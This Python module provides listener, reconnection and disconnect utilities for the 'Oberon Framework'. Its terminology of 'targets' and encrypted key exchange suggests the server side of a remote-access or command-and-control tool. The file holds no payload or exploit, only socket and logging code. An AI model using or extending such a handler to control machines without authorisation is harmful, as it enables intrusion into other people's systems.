"""Utilities for handling network connections with a client."""

from components.networking import attempt_exchange
from components.logging import log_activity
from termcolor import colored
import socket

def handle_reconnections(port: int, conn_obj: socket.socket):
    """Attempt to reconnect to the client after an unexpected disconnect."""

    print(colored("[-] A fatal error has occurred, the target terminated the connection", "red"))
    connection_retry = input("Retry Connection (y/n)? > ").strip().lower()
    if connection_retry == "y":
        print("\n[!] Reattempting . . .")
        conn_obj = connect_target(port)
        print(colored("[+] Reconnected to target!", "green", attrs=["bold"]))
        log_activity("Reconnected to target successfully.", "info")
        symmetric_key = attempt_exchange(conn_obj)
        if symmetric_key is None:
            log_activity(
                "Failed to establish a symmetric key during reconnection.", "error"
            )
            conn_obj.close()
            exit()

        return conn_obj, symmetric_key

    log_activity(
        "Program ended because the user did not want to reconnect with the target again.",
        "info",
    )
    exit("Program ended")
        
def connect_target(port: int) -> socket.socket:
    """Wait for and return a connection from a client."""

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to available interface on the specified port
    listener.bind(("0.0.0.0", port))

    # Listen for incoming connections
    listener.listen(1)
    print(f"[!] Listening for incoming connections on port {port} ...")

    # Accept a connection when the client connects
    conn_obj, _ = listener.accept()
    return conn_obj
    
def disconnect_target(conn_obj: socket.socket, shutdown_signal: str):
    """Cleanly close the connection to the client."""
    try:
        conn_obj.close()
        log_activity("Exited Oberon Framework, connection terminated successfully on server end", "info")
    except Exception as err:
        print("[-] Program ended abruptly, no connection was probably established with target")
        log_activity(f"Exited Oberon Framework, could not terminate connection on server side -> {err}", "error")

    if not shutdown_signal or shutdown_signal == "connection_not_closed":
        print(colored("[-] Target did not terminate the connection on their end", "red"))
        print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))

        log_activity("Exited Oberon Framework, connection was not terminated on targets end.", "error")
    elif shutdown_signal == "shutdown_confirmed":
        print(colored("[+] Connection terminated successfully on targets end", "green"))

        log_activity("Exited Oberon Framework, connection terminated normally between both parties.", "info")
    else:
        print(colored("[-] Unknown shutdown code retireved, unable to parse output. Connection is probably still open", "red"))
        print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))
        
        log_activity("Unknown shutdown code retireved, unable to parse output. Connection is probably still open.", "error")
